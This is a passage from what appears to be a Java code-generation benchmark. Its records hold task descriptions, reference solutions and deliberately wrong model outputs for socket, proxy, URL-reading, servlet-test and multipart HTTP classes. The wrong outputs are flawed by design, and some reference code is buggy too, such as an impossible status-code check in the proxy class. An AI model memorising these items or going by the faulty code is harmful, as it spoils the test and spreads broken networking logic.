    "Instruction": "Task Description: Implement a TCP-based unicast communication class that enables message exchange between a client and server, supporting both sending and receiving of messages with proper resource management.\n\nClass Description: UnicastTestTcp is a class that establishes TCP connections for unicast communication between two endpoints. It acts as both a client (connecting to a remote server) and a server (accepting connections from remote clients). The class handles message serialization/deserialization and provides thread-safe operations for sending messages.\n\nAttributes:\n- local: InetSocketAddress - The local address and port for server socket binding\n- remote: InetSocketAddress - The remote address and port for client connection\n- sock: Socket - The client socket for outgoing connections\n- output: DataOutputStream - The output stream for sending data to the remote endpoint\n- output_lock: Lock - A reentrant lock for thread-safe output operations\n- srv_sock: ServerSocket - The server socket for accepting incoming connections\n- acceptor: Acceptor - A thread that handles incoming connections\n\nMethods:\n- init(String local_addr, String remote_addr, int local_port, int remote_port) -> void - Initializes the communication by setting up both server and client sockets. Throws Exception if initialization fails.\n- writeMessage(Message msg, DataOutputStream out) -> static void - Serializes and writes a message to the output stream. Throws Exception if writing fails.\n- readMessage(DataInput in) -> static Message - Reads and deserializes a message from the input stream. Throws Exception if reading fails.\n- receive(Message msg) -> void - Processes received messages based on their type (START or DATA)\n\nNested Class:\n- Acceptor: Thread - Handles incoming connections and message processing\n  Methods:\n  - run() -> void - Continuously accepts new connections and processes incoming messages\n  - handleRequest(DataInputStream in) -> void - Reads and processes individual messages from an established connection. Throws Exception if processing fails.",
    "Canonical_solution": "import org.jgroups.*;\nimport org.jgroups.stack.IpAddress;\nimport org.jgroups.util.DefaultSocketFactory;\nimport org.jgroups.util.Util;\n\nimport java.io.*;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.nio.ByteBuffer;\nimport java.util.concurrent.atomic.AtomicLong;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class UnicastTestTcp {\n    protected InetSocketAddress local, remote;\n    protected Socket sock;\n    protected DataOutputStream output;\n    protected final Lock output_lock = new ReentrantLock();\n    protected ServerSocket srv_sock;\n    protected Acceptor acceptor;\n\n    protected static final boolean TCP_NODELAY = false;\n    protected static final int SOCK_SEND_BUF_SIZE = 200 * 1000;\n    protected static final int SOCK_RECV_BUF_SIZE = 200 * 1000;\n    protected static final byte START = 1;\n    protected static final byte DATA = 2;\n\n    public void init(String local_addr, String remote_addr, int local_port, int remote_port) throws Exception {\n        local = new InetSocketAddress(local_addr, local_port);\n        remote = new InetSocketAddress(remote_addr, remote_port);\n        srv_sock = Util.createServerSocket(new DefaultSocketFactory(), \"server\", local.getAddress(),\n                                         local.getPort(), local.getPort(), 0);\n        System.out.println(\"Listening on \" + srv_sock.getLocalSocketAddress());\n        acceptor = new Acceptor();\n        acceptor.start();\n\n        sock = new Socket();\n        sock.setSendBufferSize(SOCK_SEND_BUF_SIZE);\n        sock.setReceiveBufferSize(SOCK_RECV_BUF_SIZE);\n        try {\n            sock.connect(remote);\n            output = new DataOutputStream(new BufferedOutputStream(sock.getOutputStream()));\n            System.out.println(\"Connected to \" + sock.getRemoteSocketAddress());\n        }\n        catch(Throwable t) {\n            System.out.println(\"Failed connecting to \" + remote + \": will only act as server\");\n        }\n    }\n\n    protected static final void writeMessage(final Message msg, DataOutputStream out) throws Exception {\n        byte flags = 0;\n        if(msg.getDest() == null)\n            flags += (byte)2;\n        out.writeShort(Version.version);\n        out.writeByte(flags);\n        msg.writeTo(out);\n    }\n\n    protected static final Message readMessage(DataInput in) throws Exception {\n        short ver = in.readShort();\n        byte flags = in.readByte();\n        Message msg = new BytesMessage();\n        msg.readFrom(in);\n        return msg;\n    }\n\n    protected class Acceptor extends Thread {\n        public void run() {\n            while(!srv_sock.isClosed()) {\n                Socket client_sock = null;\n                DataInputStream in = null;\n                try {\n                    client_sock = srv_sock.accept();\n                    client_sock.setTcpNoDelay(TCP_NODELAY);\n                    client_sock.setReceiveBufferSize(SOCK_RECV_BUF_SIZE);\n                    client_sock.setSendBufferSize(SOCK_SEND_BUF_SIZE);\n                    in = new DataInputStream(new BufferedInputStream(client_sock.getInputStream()));\n                    while(!client_sock.isClosed())\n                        handleRequest(in);\n                }\n                catch(Exception e) {\n                    Util.close(client_sock);\n                    Util.close(in);\n                }\n            }\n        }\n\n        protected void handleRequest(DataInputStream in) throws Exception {\n            Message msg = readMessage(in);\n            receive(msg);\n        }\n    }\n\n    public void receive(Message msg) {\n        byte[] buf = msg.getArray();\n        byte type = buf[msg.getOffset()];\n\n        switch(type) {\n            case START:\n                ByteBuffer tmp = ByteBuffer.wrap(buf, 1+msg.getOffset(), Global.LONG_SIZE);\n                int num_msgs = (int)tmp.getLong();\n                System.out.println(\"Received START message with \" + num_msgs + \" messages\");\n                break;\n            case DATA:\n                System.out.println(\"Received DATA message\");\n                break;\n            default:\n                System.err.println(\"Type \" + type + \" is invalid\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class UnicastTestTcp {\n    private InetSocketAddress local;\n    private InetSocketAddress remote;\n    private Socket sock;\n    private DataOutputStream output;\n    private Lock output_lock = new ReentrantLock();\n    private ServerSocket srv_sock;\n    private Acceptor acceptor;\n\n    public void init(String local_addr, String remote_addr, int local_port, int remote_port) throws Exception {\n        local = new InetSocketAddress(local_addr, local_port);\n        remote = new InetSocketAddress(remote_addr, remote_port);\n\n        srv_sock = new ServerSocket();\n        srv_sock.bind(local);\n        acceptor = new Acceptor();\n        acceptor.start();\n\n        sock = new Socket();\n        sock.connect(remote);\n        output = new DataOutputStream(sock.getOutputStream());\n    }\n\n    public static void writeMessage(Message msg, DataOutputStream out) throws IOException {\n        byte[] data = msg.serialize();\n        out.writeInt(data.length);\n        out.write(data);\n    }\n\n    public static Message readMessage(DataInput in) throws IOException, ClassNotFoundException {\n        int len = in.readInt();\n        byte[] buffer = new byte[len];\n        in.readFully(buffer);\n        return Message.deserialize(buffer);\n    }\n\n    public void receive(Message msg) {\n        if (msg.getType() == MessageType.START) {\n            // Handle START message\n        } else if (msg.getType() == MessageType.DATA) {\n            // Handle DATA message\n        }\n    }\n\n    class Acceptor extends Thread {\n        @Override\n        public void run() {\n            while (true) {\n                try {\n                    Socket client = srv_sock.accept();\n                    handleRequest(client.getInputStream());\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        private void handleRequest(InputStream in) throws IOException, ClassNotFoundException {\n            DataInputStream dataIn = new DataInputStream(in);\n            while (true) {\n                try {\n                    Message msg = readMessage(dataIn);\n                    receive(msg);\n                } catch (EOFException e) {\n                    break;\n                }\n            }\n        }\n    }\n}\n\nclass Message implements Serializable {\n    private MessageType type;\n    private byte[] payload;\n\n    public Message(MessageType type, byte[] payload) {\n        this.type = type;\n        this.payload = payload;\n    }\n\n    public MessageType getType() {\n        return type;\n    }\n\n    public byte[] serialize() {\n        return payload;\n    }\n\n    public static Message deserialize(byte[] data) {\n        return new Message(MessageType.DATA, data);\n    }\n}\n\nenum MessageType {\n    START,\n    DATA\n}\n```"
  },
  {
    "Task_id": 589,
    "Instruction": "Task Description: Create a custom SocketFactory implementation that supports both direct connections and proxy connections (SOCKS and HTTP) with optional authentication for HTTP proxies.\n\nClass Description: CustomSocketFactory is a SocketFactory subclass that provides socket creation capabilities with proxy support. It handles both direct connections and connections through SOCKS or HTTP proxies, including HTTP proxy authentication when required.\n\nAttributes:\n- proxyHost: String - The hostname or IP address of the proxy server\n- proxyPort: int - The port number of the proxy server\n- proxyUser: String - The username for proxy authentication (optional)\n- proxyPass: String - The password for proxy authentication (optional)\n- proxyType: Proxy.Type - The type of proxy (SOCKS or HTTP)\n\nMethods:\n- createSocket(String host, int port) -> Socket - Creates a socket connected to the specified host and port\n- createSocket(String host, int port, InetAddress localHost, int localPort) -> Socket - Creates a socket connected to the specified host and port, binding to the specified local address and port\n- createSocket(InetAddress host, int port) -> Socket - Creates a socket connected to the specified InetAddress and port\n- createSocket(InetAddress address, int port, InetAddress localAddress, int localPort) -> Socket - Creates a socket connected to the specified InetAddress and port, binding to the specified local address and port\n- createSocket() -> Socket - Creates an unconnected socket with proxy configuration\n- connectToProxy(Socket socket) -> void - Handles HTTP proxy connection and authentication (private method)\n- getBasicAuthStr() -> String - Generates Base64 encoded proxy authentication string (private method)\n- readLine(InputStream in) -> String - Reads a line from the input stream (private method)\n- getResponseCode(String statusLine) -> int - Extracts HTTP response code from status line (private static method)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.util.Base64;\nimport javax.net.SocketFactory;\n\npublic class CustomSocketFactory extends SocketFactory {\n\n    private String proxyHost, proxyUser, proxyPass;\n    private int proxyPort;\n    private Proxy.Type proxyType;\n\n    public CustomSocketFactory(String proxyHost, int proxyPort,\n            String proxyUser, String proxyPass, Proxy.Type proxyType) {\n        this.proxyHost = proxyHost;\n        this.proxyPort = proxyPort;\n        this.proxyUser = proxyUser;\n        this.proxyPass = proxyPass;\n        this.proxyType = proxyType;\n    }\n\n    @Override\n    public Socket createSocket(String host, int port)\n            throws IOException, UnknownHostException {\n        return this.createSocket(InetAddress.getByName(host), port);\n    }\n\n    @Override\n    public Socket createSocket(String host, int port, InetAddress localHost,\n            int localPort) throws IOException, UnknownHostException {\n        return this.createSocket(InetAddress.getByName(host), port, localHost,\n                localPort);\n    }\n\n    @Override\n    public Socket createSocket(InetAddress host, int port) throws IOException {\n        return this.createSocket(host, port, null, 0);\n    }\n\n    @Override\n    public Socket createSocket(InetAddress address, int port,\n            InetAddress localAddress, int localPort) throws IOException {\n        Socket socket = this.createSocket();\n        if (localAddress != null) {\n            socket.bind(new InetSocketAddress(localAddress, localPort));\n        }\n        if (address != null) {\n            socket.connect(new InetSocketAddress(address, port));\n        }\n\n        if (this.proxyType == Proxy.Type.HTTP && proxyUser != null) {\n            connectToProxy(socket);\n        }\n\n        return socket;\n    }\n\n    @Override\n    public Socket createSocket() throws IOException {\n        Proxy proxy = Proxy.NO_PROXY;\n        if (this.proxyType == Proxy.Type.SOCKS) {\n            proxy = new Proxy(Proxy.Type.SOCKS,\n                    new InetSocketAddress(proxyHost, proxyPort));\n        } else if (this.proxyType == Proxy.Type.HTTP) {\n            if (proxyUser == null || proxyUser.length() < 1) {\n                proxy = new Proxy(Proxy.Type.HTTP,\n                        new InetSocketAddress(proxyHost, proxyPort));\n            }\n        }\n\n        Socket socket = new Socket(proxy);\n        return socket;\n    }\n\n    private void connectToProxy(Socket socket) throws IOException {\n        InputStream in = socket.getInputStream();\n        OutputStream out = socket.getOutputStream();\n        StringBuilder requestHeaders = new StringBuilder();\n        requestHeaders\n                .append(\"HTTP \" + proxyHost + \":\" + proxyPort + \" HTTP/1.1\\r\\n\")\n                .append(\"Host: \" + proxyHost + \":\" + proxyPort + \"\\r\\n\");\n        String proxyAuth = getBasicAuthStr();\n        if (proxyAuth != null) {\n            requestHeaders\n                    .append(\"Proxy-Authorization: basic \" + proxyAuth + \"\\r\\n\");\n        }\n        requestHeaders.append(\"\\r\\n\");\n        out.write(requestHeaders.toString().getBytes(\"utf-8\"));\n        out.flush();\n\n        String statusLine = readLine(in);\n        if (statusLine == null) {\n            socket.close();\n            throw new IOException(\"Proxy sent blank response\");\n        }\n\n        int responseCode = getResponseCode(statusLine);\n        if (responseCode < 200 && responseCode >= 300) {\n            socket.close();\n            throw new IOException(\"Invalid response code: \" + responseCode);\n        }\n\n        while (true) {\n            String line = readLine(in);\n            if (line.length() < 1)\n                break;\n        }\n    }\n\n    private String getBasicAuthStr() {\n        if (proxyUser != null && proxyUser.length() > 0) {\n            try {\n                return (Base64.getEncoder().encodeToString(\n                        (proxyUser + \":\" + (proxyPass == null ? \"\" : proxyPass))\n                                .getBytes(\"utf-8\")));\n            } catch (UnsupportedEncodingException e) {\n                e.printStackTrace();\n            }\n        }\n        return null;\n    }\n\n    public final String readLine(InputStream in) throws IOException {\n        StringBuilder buf = new StringBuilder();\n        while (true) {\n            int x = in.read();\n            if (x == -1)\n                throw new IOException(\n                        \"Unexpected EOF while reading header line\");\n            if (x == '\\n')\n                return buf.toString();\n            if (x != '\\r')\n                buf.append((char) x);\n        }\n    }\n\n    public static final int getResponseCode(String statusLine) {\n        String arr[] = statusLine.split(\" \");\n        if (arr.length < 2)\n            return 400;\n        return Integer.parseInt(arr[1]);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.Base64;\n\npublic class CustomSocketFactory extends SocketFactory {\n    private String proxyHost;\n    private int proxyPort;\n    private String proxyUser;\n    private String proxyPass;\n    private Proxy.Type proxyType;\n\n    public CustomSocketFactory(String proxyHost, int proxyPort, Proxy.Type proxyType) {\n        this.proxyHost = proxyHost;\n        this.proxyPort = proxyPort;\n        this.proxyType = proxyType;\n    }\n\n    public CustomSocketFactory(String proxyHost, int proxyPort, String proxyUser, String proxyPass, Proxy.Type proxyType) {\n        this(proxyHost, proxyPort, proxyType);\n        this.proxyUser = proxyUser;\n        this.proxyPass = proxyPass;\n    }\n\n    @Override\n    public Socket createSocket(String host, int port) throws IOException, UnknownHostException {\n        if (proxyHost == null || proxyPort <= 0) {\n            return new Socket();\n        }\n        Proxy proxy = new Proxy(proxyType, new InetSocketAddress(proxyHost, proxyPort));\n        Socket socket = new Socket(proxy);\n        socket.connect(new InetSocketAddress(host, port));\n        connectToProxy(socket);\n        return socket;\n    }\n\n    @Override\n    public Socket createSocket(String host, int port, InetAddress localHost, int localPort) throws IOException, UnknownHostException {\n        if (proxyHost == null || proxyPort <= 0) {\n            return new Socket(localHost, localPort, localHost, port);\n        }\n        Proxy proxy = new Proxy(proxyType, new InetSocketAddress(proxyHost, proxyPort));\n        Socket socket = new Socket(proxy);\n        socket.bind(new InetSocketAddress(localHost, localPort));\n        socket.connect(new InetSocketAddress(host, port));\n        connectToProxy(socket);\n        return socket;\n    }\n\n    @Override\n    public Socket createSocket(InetAddress host, int port) throws IOException {\n        if (proxyHost == null || proxyPort <= 0) {\n            return new Socket();\n        }\n        Proxy proxy = new Proxy(proxyType, new InetSocketAddress(proxyHost, proxyPort));\n        Socket socket = new Socket(proxy);\n        socket.connect(new InetSocketAddress(host, port));\n        connectToProxy(socket);\n        return socket;\n    }\n\n    @Override\n    public Socket createSocket(InetAddress address, int port, InetAddress localAddress, int localPort) throws IOException {\n        if (proxyHost == null || proxyPort <= 0) {\n            return new Socket(localAddress, localPort, address, port);\n        }\n        Proxy proxy = new Proxy(proxyType, new InetSocketAddress(proxyHost, proxyPort));\n        Socket socket = new Socket(proxy);\n        socket.bind(new InetSocketAddress(localAddress, localPort));\n        socket.connect(new InetSocketAddress(address, port));\n        connectToProxy(socket);\n        return socket;\n    }\n\n    @Override\n    public Socket createSocket() throws IOException {\n        if (proxyHost == null || proxyPort <= 0) {\n            return new Socket();\n        }\n        Proxy proxy = new Proxy(proxyType, new InetSocketAddress(proxyHost, proxyPort));\n        return new Socket(proxy);\n    }\n\n    private void connectToProxy(Socket socket) throws IOException {\n        if (proxyType != Proxy.Type.HTTP) {\n            return;\n        }\n        OutputStream out = socket.getOutputStream();\n        InputStream in = socket.getInputStream();\n\n        String request = \"CONNECT \" + socket.getRemoteSocketAddress().toString().replaceFirst(\"\\\\D+$\", \"\") + \" HTTP/1.1\\r\\n\";\n        request += \"Host: \" + socket.getRemoteSocketAddress().toString().replaceFirst(\"\\\\D+$\", \"\") + \"\\r\\n\";\n\n        if (proxyUser != null && proxyPass != null) {\n            request += \"Proxy-Authorization: Basic \" + getBasicAuthStr() + \"\\r\\n\";\n        }\n\n        request += \"\\r\\n\";\n        out.write(request.getBytes());\n        out.flush();\n\n        BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n        String statusLine = reader.readLine();\n        int responseCode = getResponseCode(statusLine);\n\n        if (responseCode != 200) {\n            throw new IOException(\"HTTP proxy connection failed: \" + statusLine);\n        }\n    }\n\n    private String getBasicAuthStr() {\n        String auth = proxyUser + \":\" + proxyPass;\n        byte[] encodedBytes = Base64.getEncoder().encode(auth.getBytes());\n        return new String(encodedBytes);\n    }\n\n    private String readLine(InputStream in) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int c;\n        while ((c = in.read()) != -1) {\n            if (c == '\\n') break;\n            sb.append((char) c);\n        }\n        return sb.toString();\n    }\n\n    private static int getResponseCode(String statusLine) {\n        try {\n            return Integer.parseInt(statusLine.split(\" \")[1]);\n        } catch (Exception e) {\n            return -1;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 59,
    "Instruction": "Task Description: Create a Java class that provides functionality to read and check the existence of URL-based resources, with support for character encoding.\n\nClass Description: The UrlTemplateResource class is designed to handle URL resources by providing methods to read their content and check their existence. It supports specifying character encoding for proper text reading and handles both regular URL connections and HTTP-specific operations.\n\nAttributes:\n- url: URL - The URL of the resource to be accessed\n- characterEncoding: String - The character encoding to be used when reading the resource (can be null)\n\nMethods:\n- Constructor: UrlTemplateResource(String path, String characterEncoding) -> void - Creates an instance with a URL path string and character encoding\n- Constructor: UrlTemplateResource(URL url, String characterEncoding) -> void - Creates an instance with a URL object and character encoding\n- reader: reader() -> Reader - Returns a Reader for the URL resource with optional character encoding\n- inputStream: inputStream() -> InputStream - Internal method that opens and returns an InputStream for the URL\n- exists: exists() -> boolean - Checks if the URL resource exists by attempting to connect to it",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.Reader;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic final class UrlTemplateResource {\n\n    private final URL url;\n    private final String characterEncoding;\n\n    public UrlTemplateResource(final String path, final String characterEncoding) throws MalformedURLException {\n        this.url = new URL(path);\n        this.characterEncoding = characterEncoding;\n    }\n\n    public UrlTemplateResource(final URL url, final String characterEncoding) {\n        this.url = url;\n        this.characterEncoding = characterEncoding;\n    }\n\n    public Reader reader() throws IOException {\n        final InputStream inputStream = inputStream();\n        if (this.characterEncoding != null && !this.characterEncoding.trim().isEmpty()) {\n            return new BufferedReader(new InputStreamReader(new BufferedInputStream(inputStream), this.characterEncoding));\n        }\n        return new BufferedReader(new InputStreamReader(new BufferedInputStream(inputStream)));\n    }\n\n    private InputStream inputStream() throws IOException {\n        final URLConnection connection = this.url.openConnection();\n        if (connection.getClass().getSimpleName().startsWith(\"JNLP\")) {\n            connection.setUseCaches(true);\n        }\n\n        final InputStream inputStream;\n        try {\n            inputStream = connection.getInputStream();\n        } catch (final IOException e) {\n            if (connection instanceof HttpURLConnection) {\n                ((HttpURLConnection) connection).disconnect();\n            }\n            throw e;\n        }\n        return inputStream;\n    }\n\n    public boolean exists() {\n        try {\n            final URLConnection connection = this.url.openConnection();\n            if (connection.getClass().getSimpleName().startsWith(\"JNLP\")) {\n                connection.setUseCaches(true);\n            }\n\n            if (connection instanceof HttpURLConnection) {\n                final HttpURLConnection httpConnection = (HttpURLConnection) connection;\n                httpConnection.setRequestMethod(\"HEAD\");\n                int responseCode = httpConnection.getResponseCode();\n                if (responseCode == HttpURLConnection.HTTP_OK) {\n                    return true;\n                } else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND) {\n                    return false;\n                }\n                if (httpConnection.getContentLength() >= 0) {\n                    return true;\n                }\n                httpConnection.disconnect();\n                return false;\n            }\n\n            if (connection.getContentLength() >= 0) {\n                return true;\n            }\n\n            final InputStream is = inputStream();\n            is.close();\n            return true;\n        } catch (final IOException ignored) {\n            return false;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class UrlTemplateResource {\n    private final URL url;\n    private final String characterEncoding;\n\n    public UrlTemplateResource(String path, String characterEncoding) throws MalformedURLException {\n        this.url = new URL(path);\n        this.characterEncoding = characterEncoding;\n    }\n\n    public UrlTemplateResource(URL url, String characterEncoding) {\n        this.url = url;\n        this.characterEncoding = characterEncoding;\n    }\n\n    public Reader reader() throws IOException {\n        InputStream inputStream = inputStream();\n        if (characterEncoding != null) {\n            return new InputStreamReader(inputStream, characterEncoding);\n        } else {\n            return new InputStreamReader(inputStream);\n        }\n    }\n\n    protected InputStream inputStream() throws IOException {\n        URLConnection connection = url.openConnection();\n        connection.setConnectTimeout(5000);\n        connection.setReadTimeout(10000);\n        return connection.getInputStream();\n    }\n\n    public boolean exists() {\n        try {\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"HEAD\");\n            int responseCode = connection.getResponseCode();\n            return (200 <= responseCode && responseCode <= 399);\n        } catch (IOException e) {\n            return false;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 590,
    "Instruction": "Task Description: Write a Java function that tests the behavior of a servlet when the client closes the socket early during an HTTP POST request. The function should verify that the servlet properly handles the premature connection closure by detecting an exception and not completing normally.\n\nFunction Description: The function `testServletInputStreamEarlyClose` creates a TCP client socket, sends an HTTP POST request with a large body, and immediately closes the socket before the server can fully process the request. It then verifies that the servlet detected the premature closure through exception handling.\n\nInput: None (The function uses predefined constants and helper classes like `DefaultServer`, `TestHttpClient`, and `EarlyCloseClientServlet`)\n\nOutput: None (The function asserts expected behavior through JUnit assertions. Side effects include socket communication and servlet state changes)",
    "Canonical_solution": "import java.net.Socket;\nimport java.io.OutputStream;\n\npublic void testServletInputStreamEarlyClose() throws Exception {\n    Assume.assumeFalse(DefaultServer.isH2());\n    TestHttpClient client = new TestHttpClient();\n    EarlyCloseClientServlet.reset();\n    try (Socket socket = new Socket()) {\n        socket.connect(DefaultServer.getDefaultServerAddress());\n        try {\n            StringBuilder sb = new StringBuilder();\n            for (int i = 0; i < 10000; ++i) {\n                sb.append(\"hello world\\r\\n\");\n            }\n            String request = \"POST /servletContext/\" + SERVLET + \" HTTP/1.1\\r\\nHost:localhost\\r\\nContent-Length:\" + sb.length() + 100 + \"\\r\\n\\r\\n\" + sb.toString();\n            OutputStream outputStream = socket.getOutputStream();\n\n            outputStream.write(request.getBytes(\"US-ASCII\"));\n            outputStream.flush();\n            socket.close();\n\n            Assert.assertTrue(EarlyCloseClientServlet.getLatch().await(10, TimeUnit.SECONDS));\n            Assert.assertFalse(EarlyCloseClientServlet.isCompletedNormally());\n            Assert.assertTrue(EarlyCloseClientServlet.isExceptionThrown());\n        } finally {\n            client.getConnectionManager().shutdown();\n        }\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\npublic void testServletInputStreamEarlyClose() throws Exception {\n    DefaultServer server = new DefaultServer();\n    EarlyCloseClientServlet servlet = new EarlyCloseClientServlet();\n    server.setServlet(servlet);\n    server.start();\n\n    TestHttpClient client = new TestHttpClient();\n    String request = \"POST / HTTP/1.1\\r\\n\" +\n                     \"Host: localhost:\" + server.getLocalPort() + \"\\r\\n\" +\n                     \"Content-Length: 1048576\\r\\n\" +\n                     \"\\r\\n\";\n    \n    try (Socket socket = new Socket(\"localhost\", server.getLocalPort())) {\n        OutputStream out = socket.getOutputStream();\n        out.write(request.getBytes(StandardCharsets.ISO_8859_1));\n        out.flush();\n        // Close the socket immediately after sending the header but before sending the body\n    }\n\n    // Wait for a short period to allow the server to process the partial request\n    Thread.sleep(100);\n\n    // Verify that the servlet detected the early close\n    assertTrue(\"Servlet should have thrown an exception due to early close\", servlet.isPrematurelyClosed());\n\n    server.stop();\n}\n```"
  },
  {
    "Task_id": 60,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for downloading images and handling multipart form data submissions.\n\nClass Description: The HttpClient class provides methods to download images via HTTP POST requests and to construct and send multipart form data (including both text parameters and file attachments) to a server. It handles connection management, request configuration, and response processing.\n\nAttributes:\n- url: String - The target URL for HTTP requests\n- con: HttpURLConnection - The HTTP connection object\n- os: OutputStream - Output stream for writing request data\n- delimiter: String - Boundary delimiter for multipart form data (default \"--\")\n- boundary: String - Unique boundary string for multipart requests (generated with timestamp)\n\nMethods:\n- HttpClient(String url) -> None - Constructor that initializes the client with target URL\n- downloadImage(String imgName) -> byte[] - Downloads an image by sending the image name as a POST parameter and returns the image data as byte array\n- connectForMultipart() -> void - Initializes connection for multipart form data submission\n- addFormPart(String paramName, String value) -> void - Adds a text parameter to multipart form data\n- addFilePart(String paramName, String fileName, byte[] data) -> void - Adds a file attachment to multipart form data\n- finishMultipart() -> void - Finalizes the multipart form data construction\n- getResponse() -> String - Retrieves and returns the server response as a string\n- writeParamData(String paramName, String value) -> void - Internal helper method for writing form parameters",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpClient {\n    private String url;\n    private HttpURLConnection con;\n    private OutputStream os;\n    \n    private String delimiter = \"--\";\n    private String boundary =  \"SwA\"+Long.toString(System.currentTimeMillis())+\"SwA\";\n\n    public HttpClient(String url) {        \n        this.url = url;\n    }\n    \n    public byte[] downloadImage(String imgName) {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        try {\n            HttpURLConnection con = (HttpURLConnection) ( new URL(url)).openConnection();\n            con.setRequestMethod(\"POST\");\n            con.setDoInput(true);\n            con.setDoOutput(true);\n            con.connect();\n            con.getOutputStream().write( (\"name=\" + imgName).getBytes());\n            \n            InputStream is = con.getInputStream();\n            byte[] b = new byte[1024];\n            \n            while ( is.read(b) != -1)\n                baos.write(b);\n            \n            con.disconnect();\n        }\n        catch(Throwable t) {\n            t.printStackTrace();\n        }\n        \n        return baos.toByteArray();\n    }\n\n    public void connectForMultipart() throws Exception {\n        con = (HttpURLConnection) ( new URL(url)).openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setDoInput(true);\n        con.setDoOutput(true);\n        con.setRequestProperty(\"Connection\", \"Keep-Alive\");\n        con.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n        con.connect();\n        os = con.getOutputStream();\n    }\n    \n    public void addFormPart(String paramName, String value) throws Exception {\n        writeParamData(paramName, value);\n    }\n    \n    public void addFilePart(String paramName, String fileName, byte[] data) throws Exception {\n        os.write( (delimiter + boundary + \"\\r\\n\").getBytes());\n        os.write( (\"Content-Disposition: form-data; name=\\\"\" + paramName +  \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\"  ).getBytes());\n        os.write( (\"Content-Type: application/octet-stream\\r\\n\"  ).getBytes());\n        os.write( (\"Content-Transfer-Encoding: binary\\r\\n\"  ).getBytes());\n        os.write(\"\\r\\n\".getBytes());\n   \n        os.write(data);\n        \n        os.write(\"\\r\\n\".getBytes());\n    }\n    \n    public void finishMultipart() throws Exception {\n        os.write( (delimiter + boundary + delimiter + \"\\r\\n\").getBytes());\n    }\n    \n    public String getResponse() throws Exception {\n        InputStream is = con.getInputStream();\n        byte[] b1 = new byte[1024];\n        StringBuffer buffer = new StringBuffer();\n        \n        while ( is.read(b1) != -1)\n            buffer.append(new String(b1));\n        \n        con.disconnect();\n        \n        return buffer.toString();\n    }\n    \n    private void writeParamData(String paramName, String value) throws Exception {\n        os.write( (delimiter + boundary + \"\\r\\n\").getBytes());\n        os.write( \"Content-Type: text/plain\\r\\n\".getBytes());\n        os.write( (\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"\\r\\n\").getBytes());;\n        os.write( (\"\\r\\n\" + value + \"\\r\\n\").getBytes());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\n\npublic class HttpClient {\n    private String url;\n    private HttpURLConnection con;\n    private OutputStream os;\n    private String delimiter = \"--\";\n    private String boundary;\n\n    public HttpClient(String url) {\n        this.url = url;\n        this.boundary = \"===\" + new SimpleDateFormat(\"yyyyMMddHHmmss\").format(new Date()) + \"===\";\n    }\n\n    public byte[] downloadImage(String imgName) throws IOException {\n        URL imageUrl = new URL(url);\n        con = (HttpURLConnection) imageUrl.openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setDoOutput(true);\n\n        try (OutputStreamWriter writer = new OutputStreamWriter(con.getOutputStream())) {\n            writer.write(\"imgName=\" + imgName);\n        }\n\n        int responseCode = con.getResponseCode();\n        if (responseCode != HttpURLConnection.HTTP_OK) {\n            throw new IOException(\"Server returned HTTP code: \" + responseCode);\n        }\n\n        try (InputStream is = con.getInputStream()) {\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = is.read(buffer)) != -1) {\n                baos.write(buffer, 0, bytesRead);\n            }\n            return baos.toByteArray();\n        }\n    }\n\n    public void connectForMultipart() throws IOException {\n        URL multipartUrl = new URL(url);\n        con = (HttpURLConnection) multipartUrl.openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setDoOutput(true);\n        con.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n        os = con.getOutputStream();\n    }\n\n    public void addFormPart(String paramName, String value) throws IOException {\n        writeParamData(paramName, value);\n    }\n\n    public void addFilePart(String paramName, String fileName, byte[] data) throws IOException {\n        writeString(os, delimiter + boundary + \"\\r\\n\");\n        writeString(os, \"Content-Disposition: form-data; 